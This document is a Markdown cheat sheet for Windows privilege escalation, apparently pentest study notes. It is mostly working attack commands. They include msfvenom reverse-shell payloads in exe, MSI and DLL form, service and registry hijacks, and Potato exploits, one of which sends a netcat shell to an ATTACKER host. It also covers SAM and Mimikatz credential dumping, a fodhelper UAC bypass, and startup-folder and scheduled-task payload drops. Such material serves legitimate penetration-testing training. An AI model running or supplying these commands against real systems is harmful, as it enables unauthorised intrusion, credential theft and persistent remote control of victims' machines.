# 🪟 Windows Privilege Escalation

> **Objective:** Escalate from low-privilege user to Administrator or SYSTEM on Windows targets.

---

## 📋 Methodology

```
1. Situational Awareness
   - whoami /all, systeminfo, net user
   - What privileges and groups do I have?

2. Automated Enumeration
   - WinPEAS, PowerUp, Seatbelt
   - Focus on highlighted findings

3. Manual Checks (in order of likelihood)
   - Service misconfigurations
   - Unquoted service paths
   - Token privileges (SeImpersonate)
   - AlwaysInstallElevated
   - Stored credentials
   - Scheduled tasks
   - DLL hijacking
   - Kernel exploits (last resort)

4. Exploit & Escalate
```

---

## 🔍 Initial Enumeration

```cmd
:: Who am I?
whoami
whoami /priv
whoami /groups
net user %username%

:: System info
systeminfo
hostname

:: Other users
net user
net localgroup administrators

:: Network
ipconfig /all
netstat -ano
route print

:: Running services
tasklist /svc
wmic service list brief

:: Installed software
wmic product get name,version
dir "C:\Program Files"
dir "C:\Program Files (x86)"

:: Search for passwords
findstr /si password *.txt *.ini *.config *.xml
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### PowerShell Enumeration
```powershell
# System info
Get-ComputerInfo
Get-Process
Get-Service | Where-Object {$_.Status -eq "Running"}

# Find writable directories
Get-ChildItem "C:\Program Files" -Recurse | Get-Acl | Where-Object {$_.AccessToString -match "Everyone|BUILTIN\\Users|Authenticated Users"}

# Search for credentials
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

---

## 📦 Transferring Files to the Target

The easiest way to get a payload onto a Windows box from Kali:

```bash
# On Kali — spin up an SMB share in the current directory
impacket-smbserver share .

# On Windows target — copy from the share
copy \\<kali_ip>\share\reverse.exe C:\PrivEsc\
```

Standard reverse shell payload used throughout Windows privesc:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe
```
Catch with: `nc -lvnp <port>`

---

## 🔧 Service Exploits

### Unquoted Service Paths
```cmd
:: Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: Example vulnerable path:
:: C:\Program Files\My App\Service\app.exe
:: Windows will try:
::   C:\Program.exe
::   C:\Program Files\My.exe
::   C:\Program Files\My App\Service\app.exe

:: Exploit: place malicious exe at writable location
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o My.exe
:: Copy to C:\Program Files\My.exe
:: Restart service: sc stop/start ServiceName
```

### Weak Service Permissions
```cmd
:: Check service permissions with accesschk (Sysinternals)
:: Note: always pass /accepteula on first run
accesschk.exe /accepteula -uwcqv user <service>
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

:: Look for SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG
:: Note the space after binpath= — it will silently fail without it
sc config <svc> binpath= "C:\PrivEsc\reverse.exe"
net start <svc>
```

### Weak Registry Permissions on Service Key
```cmd
:: Check if the service registry key itself is writable
accesschk /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<svc>

:: If writable, change the ImagePath to your payload
reg add HKLM\System\CurrentControlSet\Services\<svc> /v ImagePath /t REG_EXPAND_SZ /d "C:\PrivEsc\reverse.exe" /f
net start <svc>
```

### Insecure Service Executable
```cmd
:: Check if the service binary itself is writable
accesschk /accepteula -quvw "C:\path\to\service.exe"

:: Back up original, then overwrite
copy C:\PrivEsc\reverse.exe "C:\path\to\service.exe"
net stop <svc>
net start <svc>
```

---

## 🎫 Token Privileges (Potato Attacks)

### Check Privileges
```cmd
whoami /priv
:: Key privileges to look for:
:: SeImpersonatePrivilege - Potato attacks
:: SeAssignPrimaryTokenPrivilege - Potato attacks
:: SeBackupPrivilege - Read any file
:: SeRestorePrivilege - Write any file
:: SeTakeOwnershipPrivilege - Take ownership of files
```

### SeImpersonatePrivilege Exploits
```bash
# JuicyPotato (Windows Server 2016/2019, Win10 < 1809)
JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t *

# PrintSpoofer (Windows 10, Server 2016/2019)
PrintSpoofer.exe -i -c cmd

# GodPotato (works on all modern Windows)
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe ATTACKER 4444 -e cmd.exe"

# SweetPotato
SweetPotato.exe -p C:\temp\shell.exe

# RoguePotato
RoguePotato.exe -r ATTACKER_IP -e "C:\temp\shell.exe" -l 9999
```

---

## 📦 AlwaysInstallElevated

### Check
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both must be 1 (0x1)
```

### Exploit
```bash
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi

# Install on target (runs as SYSTEM)
msiexec /quiet /qn /i evil.msi
```

---

## 🔑 Credential Harvesting

### Stored Credentials
```cmd
:: Saved credentials
cmdkey /list
:: If found, run as that user:
runas /savecred /user:admin cmd.exe

:: SAM and SYSTEM files (if accessible)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
:: Transfer to attacker, then:
:: impacket-secretsdump -sam SAM -system SYSTEM LOCAL

:: Unattend files (installation passwords)
dir /s C:\*unattend.xml
dir /s C:\*sysprep.xml
type C:\Windows\Panther\Unattend.xml

:: WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

:: IIS config
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

### Registry Credentials
```cmd
:: AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

:: VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

:: PuTTY saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Mimikatz (if already admin/SYSTEM)
```cmd
:: Dump credentials from memory
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

:: Dump SAM
lsadump::sam

:: Dump cached credentials
lsadump::cache
```

---

## 📅 Scheduled Tasks

### Enumerate
```cmd
schtasks /query /fo LIST /v
:: Look for tasks running as SYSTEM with writable scripts

:: PowerShell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}
```

### Exploit
```cmd
:: If a scheduled task runs a writable script, append a reverse shell call
echo C:\PrivEsc\reverse.exe >> "C:\path\to\script.ps1"
:: Wait for the schedule to trigger — this is a patience technique
```

---

## 🖥️ GUI Application Privesc

If an admin-run GUI application is accessible (e.g. MS Paint running as admin), use its file browser to execute a shell:

```
File > Open > type into filename box:
file://c:/windows/system32/cmd.exe
```

This opens a cmd prompt with the application's privilege level.

---

## 📂 Startup Folder

```cmd
:: Check if the startup folder is writable
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

:: If writable, drop a payload — it runs next time an admin logs in
copy C:\PrivEsc\reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
:: Another patience technique — requires waiting for an admin login
```

---

## 📚 DLL Hijacking

### Concept
```
When a program loads a DLL, Windows searches in this order:
1. Application directory
2. System directory (C:\Windows\System32)
3. Windows directory
4. Current directory
5. PATH directories

If you can write to a directory searched BEFORE the real DLL location,
you can place a malicious DLL that gets loaded instead.
```

### Find Missing DLLs
```cmd
:: Use Process Monitor (procmon) to find "NAME NOT FOUND" DLL loads
:: Filter: Result = NAME NOT FOUND, Path ends with .dll

:: Or check writable PATH directories
echo %PATH%
icacls "C:\path\in\PATH"
```

### Exploit
```bash
# Generate malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o evil.dll

# Place in writable directory that's searched first
# Restart the service/application
```

---

## 🛡️ UAC Bypass

### Check UAC Level
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
:: 0 = No prompt, 2 = Prompt for consent, 5 = Default
```

### Common Bypasses
```powershell
# fodhelper.exe bypass (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c C:\temp\shell.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

# eventvwr.exe bypass
# Similar registry manipulation technique
```

---

## 💣 Kernel Exploits

### Common Windows Kernel Exploits
| CVE | Name | Affected |
|-----|------|----------|
| MS16-032 | Secondary Logon | Win7/8/10, Server 2008/2012 |
| MS17-010 | EternalBlue | Win7, Server 2008 |
| CVE-2020-0787 | BitsArbitraryFileMoveExploit | Win10 |
| CVE-2021-1732 | Win32k | Win10 20H2 |
| CVE-2021-36934 | HiveNightmare/SeriousSAM | Win10 |
| CVE-2021-34527 | PrintNightmare | All Windows |

### PrintNightmare
```powershell
# Check if vulnerable
Get-Service Spooler
# If running, likely vulnerable

# Exploit (add admin user)
# Use CVE-2021-34527 exploit
```

---

## 🔗 Quick Reference: Enumeration Commands

```cmd
:: === MUST-RUN FIRST ===
whoami /priv
whoami /groups
systeminfo
wmic service get name,pathname,startmode | findstr /i /v "c:\windows"

:: === CREDENTIALS ===
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
dir /s /b C:\*pass*.txt C:\*cred*.txt C:\*vnc*.ini

:: === SERVICES ===
sc query state= all
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

:: === ALWAYS CHECK ===
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## 💡 Key Takeaways

- 90% of Windows privesc is permissions being wrong, not actual exploits
- `accesschk` is the main tool to answer "can I touch this"
- One reverse shell payload reused for every task — no need for a different one per technique
- Always run `whoami` after catching a shell before assuming you're SYSTEM — some techniques land you as a different user, not SYSTEM
- Run WinPEAS/PrivescCheck early, don't save it for last
- Kernel exploits last — they can crash the machine

---

## 🔗 Associated Tools
- `Enumeration.md` — Windows privesc enumeration cheatsheet (this folder)
- WinPEAS — Automated enumeration
- PowerUp (PowerSploit) — Service exploit checks
- Seatbelt — Security-focused enumeration
- [Metasploit](../../TOOLS/metasploit.md) — Exploitation framework
- [Hashcat](../../TOOLS/Hashcat.md) — Crack found hashes
- LOLBAS (https://lolbas-project.github.io) — Living Off The Land
